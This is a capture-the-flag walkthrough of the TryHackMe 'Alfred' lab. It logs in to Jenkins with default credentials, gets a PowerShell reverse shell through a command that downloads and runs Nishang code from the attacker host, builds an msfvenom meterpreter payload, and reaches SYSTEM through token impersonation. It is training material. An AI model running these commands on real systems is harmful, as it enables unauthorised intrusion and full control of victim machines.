| [![Jenkins](/_static/images/jenkins.png)](https://tryhackme.com/room/alfred) |
|:--:|
| [https://tryhackme.com/room/alfred](https://tryhackme.com/room/alfred) |

# Alfred

Gain an initial shell, escalate privileges by exploiting Windows authentication tokens.

## Scanning

First run a simple port scan (without Ping)

	nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

    # Nmap 7.92 scan initiated Thu Sep 29 17:51:07 2022 as: nmap -Pn -p- -oN portscan 10.10.184.145
    Nmap scan report for 10.10.184.145
    Host is up, received user-set (0.043s latency).
    Scanned at 2022-09-29 17:51:07 BST for 112s
    Not shown: 65532 filtered tcp ports (no-response)
    PORT     STATE SERVICE       REASON
    80/tcp   open  http          syn-ack ttl 127
    3389/tcp open  ms-wbt-server syn-ack ttl 127
    8080/tcp open  http-proxy    syn-ack ttl 127
    
    Read data files from: /usr/bin/../share/nmap
    # Nmap done at Thu Sep 29 17:52:59 2022 -- 1 IP address (1 host up) scanned in 112.75 seconds
	
Three open ports: Two http (websites?) on port 80 and 8080, and a Remote Desktop service on port 3389.

Run an `-A` scan on the three open ports:

	nmap -Pn -T4 -A -p80,3389,8080 <IP address target machine> -oN servicescan

servicescan:

    # Nmap 7.92 scan initiated Thu Sep 29 17:57:00 2022 as: nmap -Pn -T4 -A -p80,3389,8080 -oN servicescan 10.10.184.145
    Nmap scan report for 10.10.184.145
    Host is up (0.042s latency).
    
    PORT     STATE SERVICE    VERSION
    80/tcp   open  http       Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Microsoft-IIS/7.5
    3389/tcp open  tcpwrapped
    | ssl-cert: Subject: commonName=alfred
    | Not valid before: 2022-09-28T16:47:01
    |_Not valid after:  2023-03-30T16:47:01
    8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-title: Site doesn't have a title (text/html;charset=utf-8).
    |_http-server-header: Jetty(9.4.z-SNAPSHOT)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    TRACEROUTE (using port 8080/tcp)
    HOP RTT      ADDRESS
    1   42.93 ms 10.9.0.1
    2   43.62 ms 10.10.184.145
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Thu Sep 29 17:57:34 2022 -- 1 IP address (1 host up) scanned in 35.11 seconds
	
A version for Microsoft IIS, a possible `robots.txt` on port 8080 and something called Jetty.

## Exploring

Browse to the `IP address target machine>:80` and `IP address target machine:8080` website. The first, on port 80, 
shows a silly image and message with nothing else to click or navigate to. The second shows a Jenkins login page.

Maybe default credentials are used for Jenkin and then were not changed? Researching that, the default username is 
`admin` but the password gets automatically filled, dependent on system. And then maybe changed to something more 
easily memorised?

Doing some password guessing manually, I found `admin:admin`. If that had not worked I could have tried intercepting 
a login request with Burpsuite and using Intruder to use a password list against the password field. But, as it is,
I'm already in. 

## Gaining a foothold

The Jenkins documentation gives me two possible ways of Remote Code Execution:

1. Click "Project" to get into the prebuilt project, then click  "Configure" on the left. Scrolling down, there is a 
window that allows for executing Windows batch commands.

| ![Windows batch commands window in project configuration](/_static/images/build.png)
|:--:|
| Windows batch commands window in project configuration |

Test with: `whoami`.

2. Jenkins also comes with a "Script Console" administrative tool, which allows authenticated users to run scripts 
using Apache [Groovy](http://www.groovy-lang.org/), a Java-syntax-compatible object-oriented programming language 
for the Java platform. On the mainpage on the left, click on "Manage Jenkins", scroll down below the warnings, 
and click [script console](https://www.jenkins.io/doc/book/managing/script-console/) from the list.

| [![Script console](/_static/images/script-console.png)](https://www.jenkins.io/doc/book/managing/script-console/) |
|:--:|
| [https://www.jenkins.io/doc/book/managing/script-console/](https://www.jenkins.io/doc/book/managing/script-console/) |

Test using `print` to display the output of the command: `print "whoami".execute().text`.

A PowerShell command to execute a reverse shell might work in both. `Nishang` contains a lot of reverse shell payloads 
and more.

If on Kali, copy `Invoke-PowershellTcp.ps1` from `/usr/share/nishang/Shells`. If not on Kali, 
[download Invoke-PowershellTcp.ps1 from Gihub](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1).

I decided not to copy and just host the entire Nishang Shells directory, by starting a server in the 
`/usr/share/nishang/Shells` directory:

	# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Start a listener:

    # nc -lvnp 4443
    Ncat: Version 7.92 ( https://nmap.org/ncat )

Option 1: Execute in windows batch command window:

```text
powershell iex (New-Object Net.WebClient).DownloadString(‘http://<IP address attack machine>:80/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port 443
```

Option 2: Script console:

```text
print "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port 443".execute().text
```

In the terminal with the listener:

    # nc -lvnp 4443
    Ncat: Version 7.92 ( https://nmap.org/ncat )
    Ncat: Listening on :::4443
    Ncat: Listening on 0.0.0.0:4443
    Ncat: Connection from 10.10.184.145.
    Ncat: Connection from 10.10.184.145:49217.
    Windows PowerShell running as user bruce on ALFRED
    Copyright (C) 2015 Microsoft Corporation. All rights reserved.
    
    PS C:\Program Files (x86)\Jenkins>

Get the flag:

    PS C:\Program Files (x86)\Jenkins> cd ..\..\Users\bruce\Desktop
	PS C:\Users\bruce\Desktop> cat users.txt

## Switching shells

Generate payload:

	# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=8080 -f exe -o shell.exe

Set up a Python web server to host the reverse shell:

	# python3 -m http.server 8080

Download the `shell.exe` to the target machine:

	PS  C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://[ATTACKER IP]:8080/shell.exe','shell.exe')"

In a new terminal, start Metasploit, select the multi handler module, set the payload type, LHOST and LPORT options to match the payload shell, and run the listener:

	# msfconsole -q
	msf6 > use exploit/multi/handler 
	msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
	msf6 exploit(multi/handler) > set LHOST <IP address attack machine>
	msf6 exploit(multi/handler) > set LPORT <Listen port on attack machine>
	msf6 exploit(multi/handler) > run
	
In the powershell terminal, execute the reverse shell using the Powershell `Start-Process` cmdlet:

	PS C:\Users\bruce\Desktop> Start-Process "shell.exe"

Back in the metasploit terminal:

    [*] Started reverse TCP handler on 10.9.1.53:4443 
    [*] Sending stage (175686 bytes) to 10.10.184.145
    [*] Meterpreter session 1 opened (10.9.1.53:4443 -> 10.10.184.145:49352) at 2022-09-29 20:13:30 +0100
    
    meterpreter > 

## Privilege escalation

Check privileges. Left out all disabled services for readability:

```text
PS C:\Users\bruce\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
...
SeDebugPrivilege                Debug programs                            Enabled 
...
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
...
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
...
```

It appears the current user has the SeImpersonate privilege.

## Impersonation

Load [incognito](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/), which allows for impersonating tokens:

    meterpreter > load incognito
    Loading extension incognito...Success.

List tokens:

    meterpreter > list_tokens -g
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                 Call rev2self if primary process token is SYSTEM
    
    Delegation Tokens Available
    ========================================
    \
    BUILTIN\Administrators
    ...

Impersonate:

    meterpreter > impersonate_token "BUILTIN\Administrators"
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                 Call rev2self if primary process token is SYSTEM
    [+] Delegation token available
    [+] Successfully impersonated user NT AUTHORITY\SYSTEM
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM

## Migration

```text
meterpreter > ps
Process List
============

 PID   PPID  Name               Arch  Session  User                     Path
 ---   ----  ----               ----  -------  ----                     ----
 0     0     [System Process]
 ...
 668   580   services.exe       x64   0        NT AUTHORITY\SYSTEM      C:\Windows\System32\services.exe
 ...
```

Migrate:

    meterpreter > migrate 668
    [*] Migrating from 2960 to 668...
    [*] Migration completed successfully.

## Flag

Get the flag:

    meterpreter > shell
    C:\Windows\system32>cd config
    C:\Windows\System32\config>type root.txt
    type root.txt